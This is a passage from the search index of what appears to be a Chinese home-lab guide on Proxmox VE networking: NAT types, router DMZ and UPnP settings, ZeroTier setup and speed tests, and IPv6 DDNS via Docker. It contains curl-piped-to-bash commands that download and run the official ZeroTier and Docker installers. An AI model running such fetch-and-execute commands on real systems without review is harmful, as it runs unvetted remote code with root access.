\u200b\u7c7b\u578b\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u5916\u90e8\u200b\u8fde\u63a5\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u5185\u90e8\u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u4f1a\u200b\u5bfc\u81f4\u200b\u7f51\u7edc\u200b\u7a7f\u900f\u200b\u5ef6\u8fdf\u200b\u589e\u52a0\u200b\u3002</p> <p>\u200b\u8981\u200b\u6539\u5584\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u4ee5\u4e0b\u200b\u51e0\u79cd\u200b\u65b9\u6cd5\u200b\uff08\u200b\u8981\u200b\u6839\u636e\u200b\u6211\u4eec\u200b\u7684\u200b\u5b9e\u9645\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\u6765\u200b\u9009\u62e9\u200b\u6700\u5408\u9002\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff09\uff1a</p> <ol> <li>\u200b\u5c1d\u8bd5\u200b\u4f7f\u7528\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\uff1a\u200b\u5982\u679c\u200b\u60a8\u200b\u7684\u200b\u8bbe\u5907\u200b\u6709\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u4f7f\u7528\u200b NAT \u200b\u505a\u200b\u7f51\u7edc\u200b\u8f6c\u6362\u200b\u4e86\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\uff1a\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u5916\u90e8\u200b\u6d41\u91cf\u200b\u8f6c\u53d1\u200b\u5230\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u67d0\u4e2a\u200b\u7279\u5b9a\u200b\u7aef\u53e3\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b VPN\uff1a\u200b\u4f7f\u7528\u200b VPN \u200b\u53ef\u4ee5\u200b\u5c06\u200b\u60a8\u200b\u7684\u200b\u7f51\u7edc\u8fde\u63a5\u200b\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b NAT\u3002</li> <li>\u200b\u4f7f\u7528\u200b\u7b2c\u4e09\u65b9\u200b\u670d\u52a1\u200b\uff1a\u200b\u6709\u200b\u8bb8\u591a\u200b\u7b2c\u4e09\u65b9\u200b\u670d\u52a1\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u60a8\u200b\u7a7f\u900f\u200b NAT\u3002\u200b\u4f8b\u5982\u200b\uff1aHole punch, UPnP Teredo</li> <li>\u200b\u4f7f\u7528\u200b Zerotier \u200b\u7684\u200b\u8def\u7531\u5668\u200b\u652f\u6301\u200b\u7684\u200b\u6a21\u5f0f\u200b\uff1aZerotier \u200b\u652f\u6301\u200b\u4f7f\u7528\u200b\u8def\u7531\u5668\u200b\u7684\u200b NAT-PMP \u200b\u6216\u200b UPnP \u200b\u6765\u200b\u8bbe\u7f6e\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3002</li> </ol> <p>\u200b\u4e0a\u9762\u200b\u662f\u200b\u7406\u8bba\u200b\u7684\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5728\u200b\u5b9e\u9645\u200b\u751f\u6d3b\u200b\u4e2d\u200b\u6211\u4eec\u200b\u5927\u591a\u6570\u200b\u4f1a\u200b\u91c7\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u6765\u200b\u6539\u5584\u200b\u6211\u4eec\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff1a</p> <ul> <li> \u200b\u5149\u732b\u200b\u5f00\u542f\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u4f7f\u7528\u200b\u8def\u7531\u5668\u200b\u8fdb\u884c\u200b\u62e8\u53f7\u200b</li> </ul> <p>\u200b\u8def\u7531\u5668\u200b\u76f4\u63a5\u200b\u62e8\u53f7\u200b\u5373\u53ef\u200b\u83b7\u5f97\u200b\u5916\u200b\u7f51\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5c11\u200b\u4e86\u200b\u4e00\u5c42\u200b NAT\uff0c\u200b\u4e0b\u56fe\u200b\u662f\u200b\u5c0f\u7c73\u200b\u8def\u7531\u5668\u200b\u5f00\u542f\u200b\u62e8\u53f7\u200b\u7684\u200b\u4e0a\u7f51\u200b\u4fe1\u606f\u200b\u6982\u89c8\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u770b\u5230\u200b\u83b7\u53d6\u200b\u4e86\u200b\u5916\u7f51\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\uff1a</p> <p></p> <ul> <li> \u200b\u8def\u7531\u5668\u200b\u5f00\u542f\u200b UPnP \u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u529f\u80fd\u200b</li> </ul> <p>UPnP \u200b\u6216\u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u662f\u200b\u4e00\u79cd\u200b\u534f\u8bae\u200b\u96c6\u200b\uff0c\u200b\u5141\u8bb8\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u548c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff08\u200b\u4e3b\u8981\u200b\u662f\u200b\u6e38\u620f\u200b\uff09\u200b\u81ea\u52a8\u200b\u8f6c\u53d1\u200b\u7aef\u53e3\u200b\u3002\u200b\u867d\u7136\u200b\u8fd9\u6837\u200b\u4f1a\u200b\u6781\u5927\u200b\u7684\u200b\u6539\u5584\u200b\u6211\u4eec\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u4f46\u662f\u200b\u81ea\u52a8\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u4e5f\u200b\u4f1a\u200b\u5e26\u6765\u200b\u4e00\u4e9b\u200b\u6f5c\u5728\u200b\u7684\u200b\u5b89\u5168\u200b\u98ce\u9669\u200b\u3002</p> <p> </p> <ul> <li> Windows \u200b\u4e0a\u200b\u6253\u5f00\u200b\u7f51\u7edc\u200b\u53d1\u73b0\u200b</li> </ul> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u53ef\u4ee5\u200b\u6bd4\u200b\u4f5c\u4e3a\u200b UPnP \u200b\u7684\u200b\u8ba1\u7b97\u673a\u200b\u7aef\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u4e86\u200b\u4e92\u8054\u7f51\u200b\u901f\u5ea6\u200b\u4ee5\u53ca\u200b\u8bbe\u5907\u200b\u5728\u200b Windows \u200b\u4e0a\u200b\u8f7b\u677e\u200b\u627e\u5230\u200b\u5f7c\u6b64\u200b\u7684\u200b\u80fd\u529b\u200b\uff0c\u200b\u5728\u200b\u63a7\u5236\u9762\u677f\u200b\u91cc\u9762\u200b\u627e\u5230\u200b\u300c\u200b\u9ad8\u7ea7\u200b\u5171\u4eab\u200b\u8bbe\u7f6e\u200b\u300d\u200b\u52fe\u9009\u200b\u300c\u200b\u542f\u7528\u200b\u7f51\u7edc\u200b\u53d1\u73b0\u200b\u300d\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <ul> <li> \u200b\u8def\u7531\u5668\u200b\u5f00\u542f\u200b DMZ \u200b\u529f\u80fd\u200b</li> </ul> <p>\u200b\u8def\u7531\u5668\u200b\u7684\u200bDMZ\uff08\u200b\u9694\u79bb\u533a\u200b\uff09\u200b\u662f\u200b\u6307\u200b\u5355\u4e2a\u200b\u7528\u6237\u200b\u5b8c\u5168\u200b\u66b4\u9732\u200b\u5728\u200b\u4e92\u8054\u7f51\u200b\u4e0a\u200b\uff0c\u200b\u975e\u5e38\u7b80\u5355\u200b\u7c97\u66b4\u200b\u9ad8\u6548\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u4e5f\u200b\u4f1a\u200b\u5e26\u6765\u200b\u4e00\u4e9b\u200b\u88ab\u200b\u653b\u51fb\u200b\u7684\u200b\u5b89\u5168\u200b\u98ce\u9669\u200b\uff0c\u200b\u5c0f\u7c73\u200b\u8def\u7531\u5668\u200b\u7684\u200b\u300c\u200b\u9ad8\u7ea7\u200b\u8bbe\u7f6e\u200b\u300d-\u300c\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u300d\u200b\u6700\u200b\u4e0b\u9762\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b DMZ \u200b\u529f\u80fd\u200b\uff0c\u200b\u586b\u5165\u200b\u6211\u4eec\u200b\u60f3\u8981\u200b\u6539\u5584\u200b NAT  \u200b\u7c7b\u578b\u200b\u7684\u200b\u8bbe\u5907\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u6837\u200b\u76f8\u5f53\u4e8e\u200b\u5185\u7f51\u200b\u4e2d\u200b\u7684\u200b  192.168.31.206 \u200b\u8bbe\u5907\u200b\u5b8c\u5168\u200b\u7aef\u53e3\u200b\u4e00\u5bf9\u4e00\u200b\u66b4\u9732\u200b\u5728\u200b\u6211\u4eec\u200b\u7684\u200b\u516c\u7f51\u200b IP \u200b\u4e0a\u9762\u200b\uff1a</p> <p> </p>"},{"location":"8/2/","title":"ZeroTier","text":""},{"location":"8/2/#_1","title":"\u5b89\u88c5\u200b\u4f7f\u7528","text":"<p>PVE \u200b\u57fa\u4e8e\u200b Debian \u200b\u7cfb\u7edf\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u4e00\u952e\u200b\u5b89\u88c5\u200b\u811a\u672c\u200b\u6765\u200b\u5b89\u88c5\u200b zerotier \u200b\u5ba2\u6237\u7aef\u200b\uff1a</p> Bash<pre><code>curl -s https://install.zerotier.com | bash\n</code></pre> <p>\u200b\u5b89\u88c5\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b\u76f4\u63a5\u200b\u8bbe\u7f6e\u200b\u5f00\u673a\u200b\u81ea\u542f\u200b\u7136\u540e\u200b\u52a0\u5165\u200b\u7f51\u7edc\u200b\u5373\u53ef\u200b\uff1a</p> Bash<pre><code># \u200b\u8bbe\u7f6e\u200b zerotier \u200b\u5f00\u673a\u200b\u81ea\u542f\u200b\nsystemctl enable zerotier-one.service\n\n# \u200b\u542f\u52a8\u200b zerotier \u200b\u670d\u52a1\u200b\nsystemctl start zerotier-one.service\n\n# \u200b\u52a0\u5165\u200b\u7f51\u7edc\u200b\nzerotier-cli join {NETWORK ID}\n</code></pre> <p>\u200b\u52a0\u5165\u200b\u7f51\u7edc\u200b\u540e\u200b\u5728\u200b ZeroTier Central \u200b\u7684\u200b\u7f51\u7edc\u200b\u91cc\u9762\u200b\u52fe\u9009\u200b\u65b0\u589e\u200b\u7684\u200b PVE \u200b\u5bbf\u4e3b\u673a\u200b\uff0c\u200b\u5c06\u200b\u5176\u200b\u53d8\u4e3a\u200b Auth \u200b\u8ba4\u8bc1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6b64\u65f6\u200b ZeroTier \u200b\u5c31\u200b\u4f1a\u200b\u7ed9\u200b PVE \u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u5185\u200b\u7f51\u200b IP\uff1a</p> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u5176\u4ed6\u200b\u540c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u7f51\u7edc\u200b\u7ec4\u200b\u91cc\u9762\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u8fd9\u4e2a\u200b\u5185\u7f51\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u975e\u5e38\u200b\u7684\u200b\u65b9\u4fbf\u200b\u3002</p>"},{"location":"8/2/#_2","title":"\u5ef6\u8fdf\u200b\u6d4b\u8bd5","text":"<p>\u200b\u5728\u200b\u516c\u53f8\u200b\u7f51\u7edc\u200b\u4f7f\u7528\u200b\u6c5f\u82cf\u200b\u7535\u4fe1\u200b\u7684\u200b Macbook Pro \u200b\u8bbf\u95ee\u200b\u5bb6\u91cc\u200b\u7684\u200b\u6c5f\u82cf\u200b\u79fb\u52a8\u200b\u7684\u200b PVE \u200b\u673a\u5668\u200b\uff0c\u200b\u4e00\u200b\u5f00\u59cb\u200b Ping \u200b\u7684\u200b\u5ef6\u8fdf\u200b\u5f88\u200b\u9ad8\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8981\u200b\u614c\u200b\uff0cZeroTier \u200b\u7684\u200b\u539f\u7406\u200b\u5c31\u662f\u200b\u505a\u200b\u96a7\u9053\u200b\u6253\u901a\u200b\u6700\u540e\u200b\u8d70\u200b P2P \u200b\u65b9\u5f0f\u200b\u8fde\u63a5\u200b\uff0c\u200b\u8ba9\u200b\u5b50\u5f39\u200b\u98de\u200b\u4e00\u4f1a\u513f\u200b\uff08\u200b\u4e00\u822c\u200b\u5341\u5206\u949f\u200b\u5de6\u53f3\u200b\u5427\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u540e\u9762\u200b\u7684\u200b\u7a33\u5b9a\u6027\u200b\u548c\u200b\u5ef6\u8fdf\u200b\u660e\u663e\u964d\u4f4e\u200b\u4e86\u200b\u5f88\u591a\u200b\uff1a</p> <p> </p>"},{"location":"8/2/#_3","title":"\u901f\u5ea6\u200b\u6d4b\u8bd5","text":"<p>\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b PVE \u200b\u7684\u200b Web \u200b\u63a7\u5236\u53f0\u200b\u4e0a\u4f20\u200b\uff0c\u200b\u901f\u5ea6\u200b\u53ef\u4ee5\u200b\u8dd1\u200b\u5230\u200b 11MB/s\uff1a</p> <p> </p> <p>\u200b\u4f7f\u7528\u200b ZeroTier \u200b\u6d4b\u8bd5\u200b\u5b9d\u5854\u200b\u9762\u677f\u200b\u7684\u200b\u4e0a\u4f20\u200b\u6587\u4ef6\u200b\u901f\u5ea6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8fbe\u5230\u200b 11.43 MB/s\uff1a</p> <p></p> <p>\u200b\u8fd9\u4e2a\u200b 10\u200b\u51e0\u200b MB/s \u200b\u7684\u200b\u4e0a\u4f20\u200b\u901f\u5ea6\u200b\u53ef\u80fd\u200b\u4e0d\u662f\u200b ZeroTier \u200b\u7684\u200b\u6781\u9650\u200b\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b\u6211\u200b\u8fd9\u4e2a\u200b\u6c5f\u82cf\u200b\u7535\u4fe1\u200b\u5957\u9910\u200b\u7684\u200b\u6781\u9650\u200b......</p> <p>\u200b\u603b\u7684\u6765\u8bf4\u200b\u867d\u7136\u200b\u901f\u5ea6\u200b\u4e0d\u5982\u200b\u6211\u4eec\u200b\u5185\u7f51\u200b\u5feb\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u5e26\u5bbd\u200b\u57fa\u672c\u4e0a\u200b\u79d2\u200b\u56fd\u5185\u200b\u7684\u200b\u5927\u591a\u6570\u200b\u4e2a\u4eba\u200b\u670d\u52a1\u5668\u200b\u4e86\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u5df2\u7ecf\u200b\u5f88\u200b\u6ee1\u610f\u200b\u4e86\u200b\u3002</p>"},{"location":"8/2/#_4","title":"\u6781\u7aef\u200b\u6d4b\u8bd5","text":"<p>\u200b\u56e0\u4e3a\u200b\u4e0a\u6b21\u200b\u5728\u200b\u516c\u53f8\u200b\u7684\u200b\u4e0a\u4f20\u200b\u901f\u5ea6\u200b\u6709\u9650\u200b\uff0c\u200b\u8fd9\u6b21\u200b\u5728\u200b\u5bb6\u91cc\u200b\u4f7f\u7528\u200b\u8d85\u8fc7\u200b 1000M \u200b\u7684\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5957\u9910\u200b\u6765\u200b\u770b\u770b\u200b\u4e0a\u4f20\u200b\u901f\u5ea6\u200b\u5230\u5e95\u200b\u6709\u200b\u591a\u5757\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u5feb\u200b\u8fbe\u5230\u200b\u4e86\u200b 39.6 Mb/s\uff0c\u200b\u611f\u89c9\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u6478\u200b\u5230\u200b zerotier \u200b\u7684\u200b\u4e0a\u9650\u200b\uff0c \u200b\u8fd9\u4e2a\u200b 39.6 Mb/s \u200b\u5e94\u8be5\u200b\u662f\u200b\u6211\u200b\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u5957\u9910\u200b\u7684\u200b\u4e0a\u4f20\u200b\u901f\u5ea6\u200b\u4e0a\u9650\u200b\u4e86\u200b......</p> <p>\u200b\u603b\u4e4b\u200b\uff0czerotier \u200b\u7684\u200b\u901f\u5ea6\u200b\u57fa\u672c\u4e0a\u200b\u5e94\u8be5\u200b\u65e0\u200b\u4e0a\u9650\u200b\u7684\u200b\uff0c\u200b\u5b8c\u5168\u200b\u53d6\u51b3\u4e8e\u200b\u4f60\u200b\u81ea\u5df1\u200b\u5f53\u524d\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u5bbd\u5e26\u200b\u5957\u9910\u200b\u7684\u200b\u4e0a\u4f20\u200b\u901f\u5ea6\u200b\uff0c\u200b\u5c31\u200b\u8fd9\u6837\u200b\uff0c \u200b\u4e0d\u518d\u200b\u6d4b\u8bd5\u200b\u4e86\u200b\u6e9c\u200b\u4e86\u200b\u6e9c\u200b\u4e86\u200b\u3002</p>"},{"location":"8/3/","title":"IPv6 DDNS","text":""},{"location":"8/3/#ddns","title":"DDNS \u200b\u662f\u200b\u4ec0\u4e48","text":"<p>\u200b\u901a\u4fd7\u200b\u7684\u200b\u8bf4\u200b\u6211\u4eec\u200b\u5bb6\u7528\u200b\u5bbd\u5e26\u200b\u7684\u200b IPv4 \u200b\u6216\u8005\u200b IPv6 \u200b\u57fa\u672c\u4e0a\u200b\u90fd\u200b\u4f1a\u200b\u6765\u56de\u200b\u53d8\u200b\u7684\u200b\uff0c\u200b\u4e0d\u50cf\u200b\u6211\u4eec\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u7684\u200b IP \u200b\u662f\u200b\u56fa\u5b9a\u200b\u4e0d\u53d8\u200b\u7684\u200b\uff0c\u200b\u5982\u679c\u200b\u53bb\u200b\u57df\u540d\u200b\u5382\u5546\u200b\u7684\u200b\u63a7\u5236\u53f0\u200b\u914d\u7f6e\u200b\u89e3\u6790\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6bcf\u6b21\u200b IP \u200b\u53d8\u52a8\u200b\u5f97\u200b\u91cd\u65b0\u200b\u8bbe\u7f6e\u200b\u4e00\u4e0b\u200b A \u200b\u8bb0\u5f55\u200b\uff08IPv4\uff09\u200b\u6216\u8005\u200b AAA \u200b\u8bb0\u5f55\u200b\uff08IPv6\uff09\u200b\u7684\u200b\u89e3\u6790\u200b\u662f\u200b\u5f88\u200b\u9ebb\u70e6\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u4e2a\u200b\u9002\u5408\u200b\u5c31\u200b\u6709\u200b\u4e86\u200b DDNS \u200b\u6280\u672f\u200b\u3002</p> <p>DDNS \u200b\u5168\u79f0\u200b\u4e5f\u200b\u53eb\u505a\u200b\u52a8\u6001\u200b\u57df\u540d\u89e3\u6790\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u6bcf\u9694\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u4e3b\u52a8\u200b\u53bb\u200b\u6211\u4eec\u200b\u7684\u200b\u4e91\u200b\u5382\u5546\u200b\u63a7\u5236\u53f0\u200b\u91cc\u9762\u200b\u914d\u7f6e\u200b\u57df\u540d\u89e3\u6790\u200b\uff0c\u200b\u54ea\u6015\u200b\u6211\u4eec\u200b\u7684\u200b\u57df\u540d\u200b\u53d8\u200b\u4e86\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u53ca\u65f6\u200b\u540c\u6b65\u200b\u89e3\u6790\u200b\uff0c\u200b\u8ba9\u200b\u6211\u4eec\u200b\u7684\u200b\u57df\u540d\u200b\u59cb\u7ec8\u200b\u6307\u5411\u200b\u6b63\u786e\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u3002</p>"},{"location":"8/3/#ipv4","title":"\u516c\u7f51\u200b IPv4","text":"<p>\u200b\u56e0\u4e3a\u200b\u7f51\u7edc\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0c\u200b\u5168\u7403\u200b\u7684\u200b IPv4 \u200b\u8d44\u6e90\u200b\u90fd\u200b\u5341\u5206\u200b\u7d27\u5f20\u200b\u3002\u200b\u65e9\u200b\u51e0\u5e74\u200b\u7684\u200b\u7535\u4fe1\u5bbd\u5e26\u200b\u8fd8\u662f\u200b\u81ea\u5e26\u200b\u516c\u7f51\u200b IPv4 \u200b\u7684\u200b\uff0c\u200b\u867d\u7136\u200b\u4e0d\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b\u914d\u7f6e\u200b 1 \u200b\u4e2a\u200b DDNS \u200b\u89e3\u6790\u200b\u8fd8\u662f\u200b\u6781\u597d\u200b\u7684\u200b\u3002\u200b\u4f46\u662f\u200b\u73b0\u5728\u200b 2023 \u200b\u5e74\u200b\u4e86\u200b\uff0c\u200b\u5982\u4eca\u200b\u7684\u200b\u4e2a\u4eba\u200b\u5bb6\u5ead\u200b\u5bbd\u5e26\u200b\u5e26\u200b\u516c\u7f51\u200b IPv4 \u200b\u7684\u200b\u53ef\u80fd\u6027\u200b\u5df2\u7ecf\u200b\u4e0d\u5927\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u597d\u200b\u5728\u200b IPv6 \u200b\u6280\u672f\u200b\u7684\u200b\u51fa\u73b0\u200b\u3002</p>"},{"location":"8/3/#ipv6","title":"\u516c\u7f51\u200b IPv6","text":"<p>\u200b\u56e0\u4e3a\u200b IPv6 \u200b\u7684\u200b\u8d44\u6e90\u200b\u975e\u5e38\u200b\u975e\u5e38\u200b\u591a\u200b\uff0c\u200b\u800c\u4e14\u200b\u56fd\u5bb6\u200b\u4e5f\u200b\u5f3a\u5236\u200b\u4e86\u200b\u8fd0\u8425\u5546\u200b\u9700\u8981\u200b\u5206\u914d\u200b IPv6 \u200b\u8d44\u6e90\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u4eca\u200b\u5bb6\u7528\u200b\u5bbd\u5e26\u200b\u57fa\u672c\u4e0a\u200b\u90fd\u200b\u662f\u200b\u81ea\u5e26\u200b\u5916\u7f51\u200b\u7684\u200b IPv6 \u200b\u8d44\u6e90\u200b\u7684\u200b\u3002IPv6 \u200b\u8d44\u6e90\u200b\u5206\u53d1\u200b\u5230\u200b\u6bcf\u4e2a\u200b\u5bb6\u91cc\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u662f\u200b\u4e00\u4e2a\u200b\u8d44\u6e90\u200b\u6c60\u200b\uff0c\u200b\u54ea\u6015\u200b\u5149\u732b\u200b\u4e0b\u9762\u200b\u8fde\u63a5\u200b\u8def\u7531\u5668\u200b\uff0c\u200b\u8def\u7531\u5668\u200b\u4e0b\u9762\u200b\u518d\u63a5\u200b\u4e00\u4e9b\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e9b\u200b\u8bbe\u5907\u200b\u4e5f\u200b\u83b7\u53d6\u200b\u5230\u200b\u72ec\u7acb\u200b\u7684\u200b\u516c\u7f51\u200b IPv6 \u200b\u5730\u5740\u200b\u3002\u200b\u6ca1\u9519\u200b\uff01IPv6 \u200b\u7684\u200b\u666e\u53ca\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e07\u7269\u200b\u4e92\u8054\u200b\u65f6\u4ee3\u200b\u7684\u200b\u5f00\u59cb\u200b\u3002</p>"},{"location":"8/3/#pve-ipv6","title":"PVE \u200b\u5f00\u542f\u200b IPv6","text":"<p>\u200b\u90a3\u4e48\u200b\u65e2\u7136\u200b IPv6 \u200b\u8d44\u6e90\u200b\u8fd9\u4e48\u200b\u591a\u200b\uff0c\u200b\u600e\u4e48\u200b\u4fdd\u8bc1\u200b\u6211\u4eec\u200b\u7684\u200b PVE \u200b\u4e5f\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b IPv6 \u200b\u5730\u5740\u200b\u5462\u200b\uff1f</p> <p>\u200b\u5176\u5b9e\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0cPVE \u200b\u672c\u8eab\u200b\u4e5f\u200b\u662f\u200b\u9ed8\u8ba4\u200b\u5f00\u59cb\u200b\u4e86\u200b IPv6 \u200b\u914d\u7f6e\u200b\u548c\u200b\u8f6c\u53d1\u200b\u7684\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ea\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\u81ea\u52a8\u200b\u914d\u7f6e\u200b SLAAC IPv6 \u200b\u5730\u5740\u200b\u5373\u53ef\u200b\uff1a</p> Bash<pre><code>echo \"net.ipv6.conf.all.accept_ra=2\" &gt;&gt; /etc/sysctl.conf\necho \"net.ipv6.conf.default.accept_ra=2\" &gt;&gt; /etc/sysctl.conf\necho \"net.ipv6.conf.vmbr0.accept_ra=2\" &gt;&gt; /etc/sysctl.conf\necho \"net.ipv6.conf.all.autoconf=1\" &gt;&gt; /etc/sysctl.conf\necho \"net.ipv6.conf.default.autoconf=1\" &gt;&gt; /etc/sysctl.conf\necho \"net.ipv6.conf.vmbr0.autoconf=1\" &gt;&gt; /etc/sysctl.conf\n</code></pre> <p>\u200b\u7136\u540e\u200b\u91cd\u542f\u200b PVE \u200b\u540e\u200b\u5373\u53ef\u200b\u770b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b IPv6 \u200b\u516c\u7f51\u200b\u5730\u5740\u200b\u4e86\u200b\uff1a</p> Bash<pre><code>ip a|grep inet6\n</code></pre> <p> </p>"},{"location":"8/3/#pve-docker","title":"PVE \u200b\u5b89\u88c5\u200b Docker","text":"<p>\u200b\u56e0\u4e3a\u200b DDNS-GO \u200b\u662f\u200b\u76ee\u524d\u200b\u6bd4\u8f83\u200b\u597d\u7528\u200b\u7684\u200b DDNS \u200b\u89e3\u6790\u200b\u5de5\u5177\u200b\uff0c\u200b\u8003\u8651\u200b\u5230\u200b PVE \u200b\u5e95\u5c42\u200b\u5c31\u662f\u200b Debian\uff0c\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b Docker \u200b\u6765\u200b\u90e8\u7f72\u200b DDNS-GO \u200b\u4f1a\u200b\u66f4\u52a0\u200b\u7b80\u5355\u200b\u65b9\u4fbf\u200b\u4e00\u70b9\u200b\uff0cPVE \u200b\u5b89\u88c5\u200b Docker \u200b\u4e5f\u200b\u6bd4\u8f83\u7b80\u5355\u200b\u65b9\u4fbf\u200b\uff0c\u200b\u4f7f\u7528\u200b\u5b98\u65b9\u200b\u811a\u672c\u200b\u5373\u53ef\u200b\u4e00\u952e\u200b\u5b89\u88c5\u200b\u4e86\u200b\uff1a</p> Bash<pre><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun\n</code></pre>"},{"location":"8/3/#docker-ddns-go","title":"Docker \u200b\u5b89\u88c5\u200b DDNS-GO","text":"<p>\u200b\u5b89\u88c5\u200b\u597d\u200b Docker \u200b\u7684\u8bdd\u200b\uff0c\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\u5373\u53ef\u200b\u90e8\u7f72\u200b\u642d\u5efa\u200b\u51fa\u200b DDNS-GO \u200b\u670d\u52a1\u200b\uff1a</p> Bash<pre><code>docker run -d --name ddns-go --restart=always --net=host -v /opt/ddns-go:/root jeessy/ddns-go\n</code></pre> <p>\u200b\u9ed8\u8ba4\u200b\u5927\u5bb6\u200b\u90fd\u200b\u662f\u200b\u6709\u200b Docker \u200b\u57fa\u7840\u200b\u7684\u200b\uff0c\u200b\u56fd\u5149\u200b\u7b80\u5355\u200b\u89e3\u91ca\u4e00\u4e0b\u200b\u51e0\u4e2a\u200b\u53c2\u6570\u200b\u7684\u200b\u4f5c\u7528\u200b\uff1a</p> <p>--restart=always\uff1a\u200b\u8868\u793a\u200b\u968f\u200b Docker \u200b\u670d\u52a1\u200b\u542f\u52a8\u200b\u5c31\u200b\u5f00\u542f\u200b\u81ea\u542f\u200b\u8fd9\u200b\u5bb9\u5668\u200b</p> <p>--net=host \uff1a\u200b\u8868\u793a\u200b\u4f7f\u7528\u200b host 